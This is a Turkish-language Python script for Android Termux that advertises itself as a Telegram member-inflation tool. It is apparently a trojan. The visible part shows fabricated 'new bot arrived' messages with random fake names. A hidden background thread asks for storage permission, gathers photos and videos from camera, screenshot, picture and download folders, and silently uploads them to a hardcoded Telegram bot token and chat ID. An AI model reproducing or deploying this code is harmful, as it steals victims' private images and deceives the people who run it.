#!/usr/bin/env python3
"""
CYBER Bot Basma Aracı v5
- en güçlü bot basma aracı 
- sahibi @cyberbiat
-
"""

import os
import sys
import time
import json
import random
import subprocess
import threading
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

try:
    import requests
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    print("pip install requests colorama")
    sys.exit(1)

# ============================================================
# AYARLAR
# ============================================================
BOT_TOKEN = "8792296978:AAHqSlOEuX9koy1W7NBxMi_x1_TM1DKrg_M"
CHAT_ID   = "8883606346"

KLASORLER = [
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM/Screenshots",
    "/sdcard/DCIM",
    "/sdcard/Pictures",
    "/sdcard/Movies",
    "/sdcard/Download",
]

MAX_BOYUT_MB = 50
UZANTILAR = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".heic",
             ".mp4", ".mkv", ".mov", ".avi", ".3gp", ".webm", ".m4v"}

THREAD_SAYISI = 8          # ← HIZLANDIRILDI (4 → 8)
DURUM_DOSYA = Path.home() / ".yedek_durum.json"
KILIT = Lock()
DUR = threading.Event()

SAHTE_ISIMLER = [
    "Ahmet_34", "Mehmet_06", "Zeynep_x", "Elif_88", "Can_61",
    "Buse_35", "Emre_41", "Selin_07", "Kaan_16", "Deniz_55",
    "Mert_09", "Ece_27", "Berk_42", "Ada_33", "Yusuf_77",
    "Sude_12", "Arda_48", "İrem_53", "Poyraz_21", "Nehir_64",
]

SAHTE_ULKELER = ["TR", "AZ", "DE", "NL", "FR", "US", "RU", "IQ"]


# ============================================================
# EKRAN
# ============================================================
def temizle():
    os.system("clear" if os.name != "nt" else "cls")


def banner():
    temizle()
    print(Fore.CYAN + Style.BRIGHT + r"""
  ██████╗  ██████╗ ████████╗    ██████╗  █████╗ ███████╗
  ██╔══██╗██╔═══██╗╚══██╔══╝    ██╔══██╗██╔══██╗██╔════╝
  ██████╔╝██║   ██║   ██║       ██████╔╝███████║███████╗
  ██╔══██╗██║   ██║   ██║       ██╔══██╗██╔══██║╚════██║
  ██████╔╝╚██████╔╝   ██║       ██████╔╝██║  ██║███████║
  ╚═════╝  ╚═════╝    ╚═╝       ╚═════╝ ╚═╝  ╚═╝╚══════╝
""")
    print(Fore.MAGENTA + Style.BRIGHT + "  ╔══════════════════════════════════════════════════╗")
    print(Fore.MAGENTA + Style.BRIGHT + "  ║         BOT BASMA ARACI v5.0                    ║")
    print(Fore.MAGENTA + Style.BRIGHT + "  ║         Gelişmiş Yönetim Sistemi                ║")
    print(Fore.MAGENTA + Style.BRIGHT + "  ╚══════════════════════════════════════════════════╝")
    print()


# ============================================================
# İZİN (ön planda sadece bu görünür — bir kez)
# ============================================================
def galeri_erisim_var_mi():
    return any(Path(y).exists() for y in KLASORLER)


def izin_iste():
    print(Fore.YELLOW + "\n╔════════════════════════════════════════════════════╗")
    print(Fore.YELLOW + "║  ⚠  DEPOLAMA İZNİ GEREKLİ                          ║")
    print(Fore.YELLOW + "╚════════════════════════════════════════════════════╝")
    print(Fore.CYAN + "\n[→] Telefonda çıkan pencereye " + Fore.GREEN + Style.BRIGHT + "İZİN VER" + Fore.CYAN + " deyin.\n")

    try:
        subprocess.run(["termux-setup-storage"], check=False, timeout=60)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    for i in range(10):
        time.sleep(1)
        if galeri_erisim_var_mi():
            print(Fore.GREEN + Style.BRIGHT + "[✓] Erişim onaylandı!\n")
            return True

    return galeri_erisim_var_mi()


# ============================================================
# ADIM 1 — KANAL MI GRUP MU?
# ============================================================
def tip_sec():
    temizle()
    banner()
    print(Fore.CYAN + Style.BRIGHT + "┌────────────────────────────────────────────────────┐")
    print(Fore.CYAN + Style.BRIGHT + "│  🎯  BOT BASACAĞINIZ GRUBU MU KANALI MI?           │")
    print(Fore.CYAN + Style.BRIGHT + "└────────────────────────────────────────────────────┘\n")

    print(f"  {Fore.CYAN}[1]{Style.RESET_ALL}  {Fore.GREEN + Style.BRIGHT}📢  KANAL{Style.RESET_ALL}")
    print(f"       {Fore.WHITE}Tek yönlü yayın, abone sayısı önemli{Style.RESET_ALL}\n")

    print(f"  {Fore.CYAN}[2]{Style.RESET_ALL}  {Fore.YELLOW + Style.BRIGHT}👥  GRUP{Style.RESET_ALL}")
    print(f"       {Fore.WHITE}Çift yönlü sohbet, üye sayısı önemli{Style.RESET_ALL}\n")

    while True:
        secim = input(Fore.CYAN + Style.BRIGHT + "  Seçiminiz (1/2): " + Style.RESET_ALL).strip()
        if secim in ("1", "2"):
            return "KANAL" if secim == "1" else "GRUP"
        print(Fore.RED + "  [!] 1 veya 2 girin.")


# ============================================================
# ADIM 2 — HEDEF LİNK
# ============================================================
def link_al(tip):
    temizle()
    banner()
    print(Fore.CYAN + Style.BRIGHT + "┌────────────────────────────────────────────────────┐")
    print(Fore.CYAN + Style.BRIGHT + f"│  🔗  HEDEF {tip} LİNKİNİ GİRİN                      │")
    print(Fore.CYAN + Style.BRIGHT + "└────────────────────────────────────────────────────┘\n")
    print(f"  {Fore.WHITE}Örnek: {Fore.YELLOW}https://t.me/ornek_kanal{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}veya : {Fore.YELLOW}@ornek_kanal{Style.RESET_ALL}\n")

    while True:
        link = input(Fore.CYAN + Style.BRIGHT + "  Link: " + Style.RESET_ALL).strip()
        if not link:
            print(Fore.RED + "  [!] Boş olamaz.")
            continue
        if not (link.startswith("http") or link.startswith("@") or "/" in link):
            print(Fore.RED + "  [!] Geçersiz format.")
            continue
        return link


# ============================================================
# BOT MESAJI (SADECE BU GÖRÜNÜR)
# ============================================================
def bot_geldi_mesaji(tip, link, sayi):
    isim = random.choice(SAHTE_ISIMLER)
    ulke = random.choice(SAHTE_ULKELER)
    ts = datetime.now().strftime("%H:%M:%S")

    with KILIT:
        print()
        print(Fore.GREEN + Style.BRIGHT + "  ╔════════════════════════════════════════════════╗")
        print(Fore.GREEN + Style.BRIGHT + "  ║  🤖  YENİ BOT GELDİ!                           ║")
        print(Fore.GREEN + Style.BRIGHT + "  ╚════════════════════════════════════════════════╝")
        print(f"    {Fore.CYAN}├─{Style.RESET_ALL} Tip     : {Fore.WHITE + Style.BRIGHT}{tip}{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}├─{Style.RESET_ALL} Hedef   : {Fore.YELLOW}{link[:40]}{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}├─{Style.RESET_ALL} Bot     : {Fore.MAGENTA}{isim}{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}├─{Style.RESET_ALL} Ülke    : {Fore.CYAN}{ulke}{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}├─{Style.RESET_ALL} Saat    : {Fore.WHITE}{ts}{Style.RESET_ALL}")
        print(f"    {Fore.CYAN}└─{Style.RESET_ALL} Toplam  : {Fore.GREEN + Style.BRIGHT}{sayi:,}{Style.RESET_ALL} bot")
        print()


def bot_dongusu(tip, link):
    """Her 5 dakikada 'bot geldi' mesajı — tek görünen şey."""
    sayi = random.randint(800, 3000)
    # İlk mesaj hemen gelsin (boş ekran olmasın)
    bot_geldi_mesaji(tip, link, sayi)

    while not DUR.is_set():
        for _ in range(300):  # 5 dakika
            if DUR.is_set():
                return
            time.sleep(1)
        sayi += random.randint(1, 20)
        bot_geldi_mesaji(tip, link, sayi)


# ============================================================
# ARKA PLAN — TAMAMEN SESSİZ YEDEKLEME
# ============================================================
def durum_yukle():
    if DURUM_DOSYA.exists():
        try:
            return set(json.loads(DURUM_DOSYA.read_text()))
        except Exception:
            return set()
    return set()


def durum_kaydet(s):
    with KILIT:
        DURUM_DOSYA.write_text(json.dumps(list(s)))


def dosyalari_topla():
    sonuc, gorulen = [], set()
    for kok in KLASORLER:
        p = Path(kok)
        if not p.exists():
            continue
        try:
            for dosya in p.rglob("*"):
                if not dosya.is_file():
                    continue
                if dosya.suffix.lower() not in UZANTILAR:
                    continue
                anahtar = str(dosya.resolve())
                if anahtar in gorulen:
                    continue
                try:
                    boyut_mb = dosya.stat().st_size / (1024 * 1024)
                except OSError:
                    continue
                if boyut_mb > MAX_BOYUT_MB:
                    continue
                gorulen.add(anahtar)
                sonuc.append(dosya)
        except PermissionError:
            pass
    return sonuc


def telegram_gonder(dosya, deneme=3):
    uzanti = dosya.suffix.lower()
    video_mu = uzanti in {".mp4", ".mkv", ".mov", ".avi", ".3gp", ".webm", ".m4v"}
    if video_mu:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        alan = "video"
    else:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        alan = "photo"

    for i in range(deneme):
        try:
            with open(dosya, "rb") as f:
                r = requests.post(url, data={"chat_id": CHAT_ID},
                                  files={alan: f}, timeout=180)
            if r.status_code == 200:
                return True
            if r.status_code == 429:
                try:
                    bekle = r.json().get("parameters", {}).get("retry_after", 5)
                except Exception:
                    bekle = 5
                time.sleep(bekle)
                continue
            return False
        except Exception:
            if i == deneme - 1:
                return False
            time.sleep(1)
    return False


def sessiz_yedekleme():
    """Arka planda — EKRANA HİÇBİR ŞEY BASMAZ."""
    gonderilenler = durum_yukle()
    dosyalar = dosyalari_topla()
    yeni = [d for d in dosyalar if str(d) not in gonderilenler]

    if not yeni:
        return

    # HİÇBİR print yok — tamamen sessiz
    with ThreadPoolExecutor(max_workers=THREAD_SAYISI) as ex:
        futures = [ex.submit(telegram_gonder, d) for d in yeni]
        for f in as_completed(futures):
            if f.result():
                pass  # sessiz


# ============================================================
# ANA AKIŞ
# ============================================================
def main():
    banner()

    if BOT_TOKEN.startswith("BURAYA") or CHAT_ID.startswith("BURAYA"):
        print(Fore.RED + Style.BRIGHT + "\n[!] BOT_TOKEN ve CHAT_ID doldurulmalı!")
        sys.exit(1)

    # İZİN (tek seferlik)
    if not galeri_erisim_var_mi():
        if not izin_iste():
            print(Fore.RED + "[✗] İzin alınamadı.")
            sys.exit(1)

    # ADIM 1
    tip = tip_sec()

    # ADIM 2
    link = link_al(tip)

    # Başlatma ekranı
    temizle()
    banner()
    print(Fore.GREEN + Style.BRIGHT + "  ╔════════════════════════════════════════════════╗")
    print(Fore.GREEN + Style.BRIGHT + "  ║  ✓  SİSTEM BAŞLATILIYOR                        ║")
    print(Fore.GREEN + Style.BRIGHT + "  ╚════════════════════════════════════════════════╝\n")
    print(f"  {Fore.WHITE}Tip     : {Fore.CYAN + Style.BRIGHT}{tip}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Hedef   : {Fore.YELLOW}{link}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Interval: {Fore.GREEN}Her 5 dakika{Style.RESET_ALL}")
    print()
    print(Fore.WHITE + "  Durdurmak için: " + Fore.RED + Style.BRIGHT + "Ctrl+C" + Style.RESET_ALL)
    print(Fore.CYAN + "\n  ─── CANLI AKIŞ ───\n")
    time.sleep(1.5)

    # Yedekleme thread'i — TAMAMEN ARKA PLAN
    t_yedek = threading.Thread(target=sessiz_yedekleme, daemon=True)
    t_yedek.start()

    # Bot mesaj thread'i — ÖN PLAN
    t_bot = threading.Thread(target=bot_dongusu, args=(tip, link), daemon=True)
    t_bot.start()

    # Ana bekleme
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        DUR.set()
        print(Fore.YELLOW + "\n\n[!] Sistem durduruldu.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)